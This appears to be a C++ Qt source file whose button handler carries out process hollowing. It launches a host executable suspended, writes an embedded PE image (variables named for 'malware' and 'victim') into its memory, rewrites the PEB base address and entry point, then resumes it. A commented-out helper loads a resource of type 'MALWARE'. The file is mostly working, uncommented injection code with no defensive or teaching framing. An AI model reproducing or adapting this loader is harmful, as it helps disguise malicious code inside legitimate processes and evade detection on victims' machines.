#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "odin.h"


//LPVOID MainWindow::ExtractRes(HMODULE hModule)
//{
//	HRSRC hResInfo;
//	HGLOBAL hResData;
//	LPVOID lpResLock;
//	DWORD dwSize;
//	LPVOID lpAddr;

//	if (hModule == NULL)
//	{
//		return NULL;
//	}
//	QString aa("MALWARE");
//	hResInfo = FindResource(hModule, MAKEINTRESOURCE(101), (LPCWSTR)(aa.utf16()));
//	qDebug()<<(hResInfo==NULL);
//	if (hResInfo == NULL)
//	{
//		return NULL;
//	}

//	hResData = LoadResource(hModule, hResInfo);
//	if (hResData == NULL)
//	{
//		return NULL;
//	}

//	lpResLock = LockResource(hResData);
//	if (lpResLock == NULL)
//	{
//		return NULL;
//	}

//	dwSize = SizeofResource(hModule, hResInfo);
//	if (dwSize == 0)
//	{
//		return NULL;
//	}

//	lpAddr = VirtualAlloc(0, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//	if (lpAddr == NULL)
//	{
//		return NULL;
//	}
//	memcpy(lpAddr, lpResLock, dwSize);

//	return lpAddr;
//}

int MainWindow::ReplaceProcess(char *cAppName, LPVOID lpAddr)
{
	return 0;
}


MainWindow::MainWindow(QWidget *parent) :
	QMainWindow(parent),
	ui(new Ui::MainWindow)
{
	ui->setupUi(this);
}

MainWindow::~MainWindow()
{
	delete ui;
}

void MainWindow::on_pushButton_clicked()
{
	HMODULE hModule = GetModuleHandle(NULL);
	//TCHAR cAppName[MAX_PATH] = _T("c:\\windows\\system32\\svchost.exe");
	QString aa = "d:\\puppet.exe";
//	TCHAR cAppName[MAX_PATH] = _T("d:\\puppet.exe");
	TCHAR *cAppName = (TCHAR *)aa.utf16();
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNtHeaders;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPVOID lpMalwareBaseAddr;
	DWORD dwVictimBaseAddr;	// Base address of the victim
	LPVOID lpNewVictimBaseAddr;
	CONTEXT context;
	DWORD idx;

//	lpMalwareBaseAddr = ExtractRes(hModule);
	lpMalwareBaseAddr = (LPVOID)(gOdinExe);
	if (lpMalwareBaseAddr == NULL)
	{
		return ;
	}

	// Check DOS header magic
	pDosHeader = (PIMAGE_DOS_HEADER)lpMalwareBaseAddr;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return ;
	}

	// Check PE header magic
	pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpMalwareBaseAddr + pDosHeader->e_lfanew);
	if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE )
	{
		return ;
	}

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	if (CreateProcess(cAppName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,	NULL, NULL,	&si, &pi) == 0)
	{
		return ;
	}

	context.ContextFlags = CONTEXT_FULL;
	if (GetThreadContext(pi.hThread, &context) == 0)
	{
		return ;
	}

	// EBX points to PEB, offset 8 is the pointer to the base address
	if (ReadProcessMemory(pi.hProcess, (LPCVOID)(context.Ebx + 8), &dwVictimBaseAddr, sizeof(PVOID), NULL) == 0)
	{
		return ;
	}



	lpNewVictimBaseAddr = VirtualAllocEx(pi.hProcess,
							(LPVOID)pNtHeaders->OptionalHeader.ImageBase,
							pNtHeaders->OptionalHeader.SizeOfImage,
							MEM_COMMIT | MEM_RESERVE,
							PAGE_EXECUTE_READWRITE);
	if (lpNewVictimBaseAddr == NULL)
	{
		return ;
	}

	// Replace headers
	WriteProcessMemory(pi.hProcess, lpNewVictimBaseAddr, lpMalwareBaseAddr, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

	// Replace sections
	LPVOID lpSectionBaseAddr = (LPVOID)((DWORD)lpMalwareBaseAddr + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
	PIMAGE_SECTION_HEADER pSectionHeader;
	for (idx = 0; idx < pNtHeaders->FileHeader.NumberOfSections; ++idx)
	{
		pSectionHeader = (PIMAGE_SECTION_HEADER)lpSectionBaseAddr;
		WriteProcessMemory(pi.hProcess,
			(LPVOID)((DWORD)lpNewVictimBaseAddr + pSectionHeader->VirtualAddress),
			(LPCVOID)((DWORD)lpMalwareBaseAddr + pSectionHeader->PointerToRawData),
			pSectionHeader->SizeOfRawData,
			NULL);
		lpSectionBaseAddr = (LPVOID)((DWORD)lpSectionBaseAddr + sizeof(IMAGE_SECTION_HEADER));
	}

	// Replace the value of base address in the PEB
	DWORD dwImageBase = pNtHeaders->OptionalHeader.ImageBase;
	WriteProcessMemory(pi.hProcess, (LPVOID)(context.Ebx + 8), (LPCVOID)&dwImageBase, sizeof(PVOID), NULL);

	// Replace Entry Point Address
	context.Eax = dwImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
	SetThreadContext(pi.hThread, &context);
	ResumeThread(pi.hThread);

	return;
}
